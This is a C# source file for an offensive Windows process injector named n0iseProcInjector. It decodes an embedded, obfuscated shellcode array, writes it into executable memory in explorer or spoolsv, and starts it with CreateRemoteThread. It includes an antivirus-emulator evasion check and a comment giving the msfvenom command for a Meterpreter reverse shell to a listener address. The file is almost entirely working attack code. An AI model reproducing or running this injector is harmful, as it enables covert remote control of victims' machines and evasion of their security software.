﻿using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace n0iseProcInjector
{

    internal class Program
    {
        [Flags]
        public enum ProcessAccessFlags : uint
        {
            All = 0x001F0FFF //PROCESS_ALL_ACCESS
        }
        [Flags]
        public enum AllocationType
        {
            Commit = 0x1000,
            Reserve = 0x2000
        }

        [Flags]
        public enum MemoryProtection
        {
            ExecuteReadWrite = 0x40
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(ProcessAccessFlags processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        static bool IsElevated
        {
            get
            {
                return WindowsIdentity.GetCurrent().Owner.IsWellKnown(WellKnownSidType.BuiltinAdministratorsSid);
            }
        }

        static void Main(string[] args)
        {
            // detect AV emulator
            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return;
            }

            // payload sample, need to change!!! payload can be generated by msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.113 LPORT=443 EXITFUNC=thread -f csharp
            /*
            byte[] buf = new byte[5] {
            0xa5, 0x48, 0xfa, 0xee, 0x45
            };
            */

            byte[] buf = new byte[727] { 0x03, 0x4f, 0x8a, 0xeb, 0xf7, 0xef, 0xd3, 0x07, 0x07, 0x07, 0x48, 0x58, 0x48, 0x57, 0x59, 0x4f, 0x38, 0xd9, 0x58, 0x5d, 0x6c, 0x4f, 0x92, 0x59, 0x67, 0x4f, 0x92, 0x59, 0x1f, 0x4f, 0x92, 0x59, 0x27, 0x4f, 0x92, 0x79, 0x57, 0x54, 0x38, 0xd0, 0x4f, 0x16, 0xbe, 0x51, 0x51, 0x4f, 0x38, 0xc7, 0xb3, 0x43, 0x68, 0x83, 0x09, 0x33, 0x27, 0x48, 0xc8, 0xd0, 0x14, 0x48, 0x08, 0xc8, 0xe9, 0xf4, 0x59, 0x48, 0x58, 0x4f, 0x92, 0x59, 0x27, 0x92, 0x49, 0x43, 0x4f, 0x08, 0xd7, 0x6d, 0x88, 0x7f, 0x1f, 0x12, 0x09, 0x16, 0x8c, 0x79, 0x07, 0x07, 0x07, 0x92, 0x87, 0x8f, 0x07, 0x07, 0x07, 0x4f, 0x8c, 0xc7, 0x7b, 0x6e, 0x4f, 0x08, 0xd7, 0x4b, 0x92, 0x47, 0x27, 0x57, 0x50, 0x08, 0xd7, 0x92, 0x4f, 0x1f, 0xea, 0x5d, 0x4f, 0x06, 0xd0, 0x48, 0x92, 0x3b, 0x8f, 0x4f, 0x08, 0xdd, 0x54, 0x38, 0xd0, 0x4f, 0x38, 0xc7, 0xb3, 0x48, 0xc8, 0xd0, 0x14, 0x48, 0x08, 0xc8, 0x3f, 0xe7, 0x7c, 0xf8, 0x53, 0x0a, 0x53, 0x2b, 0x0f, 0x4c, 0x40, 0xd8, 0x7c, 0xdf, 0x5f, 0x4b, 0x92, 0x47, 0x2b, 0x50, 0x08, 0xd7, 0x6d, 0x48, 0x92, 0x13, 0x4f, 0x4b, 0x92, 0x47, 0x23, 0x50, 0x08, 0xd7, 0x48, 0x92, 0x0b, 0x8f, 0x48, 0x5f, 0x4f, 0x08, 0xd7, 0x48, 0x5f, 0x65, 0x60, 0x61, 0x48, 0x5f, 0x48, 0x60, 0x48, 0x61, 0x4f, 0x8a, 0xf3, 0x27, 0x48, 0x59, 0x06, 0xe7, 0x5f, 0x48, 0x60, 0x61, 0x4f, 0x92, 0x19, 0xf0, 0x52, 0x06, 0x06, 0x06, 0x64, 0x4f, 0x38, 0xe2, 0x5a, 0x50, 0xc5, 0x7e, 0x70, 0x75, 0x70, 0x75, 0x6c, 0x7b, 0x07, 0x48, 0x5d, 0x4f, 0x90, 0xe8, 0x50, 0xce, 0xc9, 0x53, 0x7e, 0x2d, 0x0e, 0x06, 0xdc, 0x5a, 0x5a, 0x4f, 0x90, 0xe8, 0x5a, 0x61, 0x54, 0x38, 0xc7, 0x54, 0x38, 0xd0, 0x5a, 0x5a, 0x50, 0xc1, 0x41, 0x5d, 0x80, 0xae, 0x07, 0x07, 0x07, 0x07, 0x06, 0xdc, 0xef, 0x14, 0x07, 0x07, 0x07, 0x38, 0x37, 0x35, 0x38, 0x37, 0x35, 0x38, 0x37, 0x35, 0x38, 0x38, 0x3a, 0x07, 0x61, 0x4f, 0x90, 0xc8, 0x50, 0xce, 0xc7, 0xc2, 0x08, 0x07, 0x07, 0x54, 0x38, 0xd0, 0x5a, 0x5a, 0x71, 0x0a, 0x5a, 0x50, 0xc1, 0x5e, 0x90, 0xa6, 0xcd, 0x07, 0x07, 0x07, 0x07, 0x06, 0xdc, 0xef, 0xb6, 0x07, 0x07, 0x07, 0x36, 0x56, 0x39, 0x77, 0x61, 0x4d, 0x75, 0x72, 0x75, 0x7b, 0x80, 0x7f, 0x6e, 0x34, 0x39, 0x4f, 0x3c, 0x48, 0x58, 0x74, 0x73, 0x3c, 0x7e, 0x7b, 0x71, 0x53, 0x5c, 0x7f, 0x5c, 0x79, 0x5c, 0x40, 0x37, 0x7d, 0x3b, 0x74, 0x80, 0x3f, 0x51, 0x51, 0x34, 0x7d, 0x7b, 0x6f, 0x5a, 0x6e, 0x6b, 0x56, 0x80, 0x4d, 0x61, 0x6f, 0x4e, 0x4f, 0x6b, 0x5d, 0x54, 0x59, 0x66, 0x7f, 0x5b, 0x7d, 0x58, 0x49, 0x37, 0x3a, 0x5f, 0x73, 0x3b, 0x3d, 0x81, 0x53, 0x7c, 0x7b, 0x74, 0x61, 0x55, 0x3c, 0x66, 0x81, 0x7d, 0x69, 0x7c, 0x4a, 0x80, 0x79, 0x70, 0x60, 0x72, 0x5a, 0x4a, 0x75, 0x3d, 0x75, 0x7f, 0x6c, 0x71, 0x72, 0x61, 0x4a, 0x53, 0x6f, 0x6c, 0x55, 0x51, 0x71, 0x66, 0x5f, 0x6f, 0x5e, 0x38, 0x48, 0x58, 0x3b, 0x54, 0x6c, 0x69, 0x50, 0x71, 0x6b, 0x4f, 0x56, 0x66, 0x49, 0x7a, 0x6c, 0x5f, 0x50, 0x48, 0x4d, 0x4f, 0x3e, 0x60, 0x80, 0x76, 0x37, 0x3d, 0x77, 0x73, 0x78, 0x5b, 0x7e, 0x66, 0x7d, 0x5b, 0x68, 0x3a, 0x50, 0x5d, 0x80, 0x73, 0x7b, 0x3c, 0x6e, 0x34, 0x6b, 0x73, 0x6a, 0x80, 0x5e, 0x49, 0x70, 0x5d, 0x6b, 0x5e, 0x50, 0x5e, 0x6b, 0x5d, 0x69, 0x3e, 0x74, 0x55, 0x55, 0x07, 0x4f, 0x90, 0xc8, 0x5a, 0x61, 0x48, 0x5f, 0x54, 0x38, 0xd0, 0x5a, 0x4f, 0xbf, 0x07, 0x39, 0xaf, 0x8b, 0x07, 0x07, 0x07, 0x07, 0x57, 0x5a, 0x5a, 0x50, 0xce, 0xc9, 0xf2, 0x5c, 0x35, 0x42, 0x06, 0xdc, 0x4f, 0x90, 0xcd, 0x71, 0x11, 0x66, 0x4f, 0x90, 0xf8, 0x71, 0x26, 0x61, 0x59, 0x6f, 0x87, 0x3a, 0x07, 0x07, 0x50, 0x90, 0xe7, 0x71, 0x0b, 0x48, 0x60, 0x50, 0xc1, 0x7c, 0x4d, 0xa5, 0x8d, 0x07, 0x07, 0x07, 0x07, 0x06, 0xdc, 0x54, 0x38, 0xc7, 0x5a, 0x61, 0x4f, 0x90, 0xf8, 0x54, 0x38, 0xd0, 0x54, 0x38, 0xd0, 0x5a, 0x5a, 0x50, 0xce, 0xc9, 0x34, 0x0d, 0x1f, 0x82, 0x06, 0xdc, 0x8c, 0xc7, 0x7c, 0x26, 0x4f, 0xce, 0xc8, 0x8f, 0x1a, 0x07, 0x07, 0x50, 0xc1, 0x4b, 0xf7, 0x3c, 0xe7, 0x07, 0x07, 0x07, 0x07, 0x06, 0xdc, 0x4f, 0x06, 0xd6, 0x7b, 0x09, 0xf2, 0xb1, 0xef, 0x5c, 0x07, 0x07, 0x07, 0x5a, 0x60, 0x71, 0x47, 0x61, 0x50, 0x90, 0xd8, 0xc8, 0xe9, 0x17, 0x50, 0xce, 0xc7, 0x07, 0x17, 0x07, 0x07, 0x50, 0xc1, 0x5f, 0xab, 0x5a, 0xec, 0x07, 0x07, 0x07, 0x07, 0x06, 0xdc, 0x4f, 0x9a, 0x5a, 0x5a, 0x4f, 0x90, 0xee, 0x4f, 0x90, 0xf8, 0x4f, 0x90, 0xe1, 0x50, 0xce, 0xc7, 0x07, 0x27, 0x07, 0x07, 0x50, 0x90, 0x00, 0x50, 0xc1, 0x19, 0x9d, 0x90, 0xe9, 0x07, 0x07, 0x07, 0x07, 0x06, 0xdc, 0x4f, 0x8a, 0xcb, 0x27, 0x8c, 0xc7, 0x7b, 0xb9, 0x6d, 0x92, 0x0e, 0x4f, 0x08, 0xca, 0x8c, 0xc7, 0x7c, 0xd9, 0x5f, 0xca, 0x5f, 0x71, 0x07, 0x60, 0x50, 0xce, 0xc9, 0xf7, 0xbc, 0xa9, 0x5d, 0x06, 0xdc };


            int len = buf.Length;

            // parse arguments
            String procName = "";
            if (args.Length == 1)
            {
                procName = args[0];
            }
            else if (args.Length == 0)
            {
                // elevation default proc names
                if (IsElevated)
                {
                    procName = "spoolsv";
                    Console.WriteLine("Running not elevated. Injecting to {0}", procName);
                }
                else
                {
                    procName = "explorer";
                    Console.WriteLine("Running not elevated. Injecting to {0}", procName);
                }
            }
            else
            {
                Console.WriteLine("Help: either specify existing running process name to inject to by running \"n0iseProcInjector [runningProcessName]\" or just run the tool to automatically inject into suitable running process based on elevation.");
                return;
            }

            Console.WriteLine($"Attempting to inject into {procName} process...");

            // get proc ID
            Process[] expProc = Process.GetProcessesByName(procName);

            // if multiple match, inject into all
            for (int i = 0; i < expProc.Length; i++)
            {
                int pid = expProc[i].Id;

                // get process handle
                IntPtr hProcess = OpenProcess(ProcessAccessFlags.All, false, pid);
                if ((int)hProcess == 0)
                {
                    Console.WriteLine($"Failed to get handle on PID {pid}.");
                    continue;
                }
                Console.WriteLine($"Got handle {hProcess} on PID {pid}.");

                // Allocate memory in the remote process
                IntPtr expAddr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)len, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ExecuteReadWrite);
                Console.WriteLine($"Allocated {len} bytes at address {expAddr} in remote process.");

                // Decode the XOR encoded (key 0xfe) payload if necessary
                /*
                for (int j = 0; j < buf.Length; j++)
                {
                    buf[j] = (byte)((uint)buf[j] ^ 0xfe);
                }
                */

                // Decode the caesar cipher encrypted (key 4) payload if necessary
                ///*
                for (int e = 0; e < buf.Length; e++)
                {
                    buf[e] = (byte)(((uint)buf[e] - 7) & 0xFF);
                }
                //*/

                // inject
                IntPtr bytesWritten;
                bool procMemResult = WriteProcessMemory(hProcess, expAddr, buf, len, out bytesWritten);
                Console.WriteLine($"Wrote {bytesWritten} payload bytes (result: {procMemResult}).");

                IntPtr threadAddr = CreateRemoteThread(hProcess, IntPtr.Zero, 0, expAddr, IntPtr.Zero, 0, IntPtr.Zero);
                Console.WriteLine($"Created remote thread at {threadAddr}. Check your listener!");
                break;
            }
        }
    }
}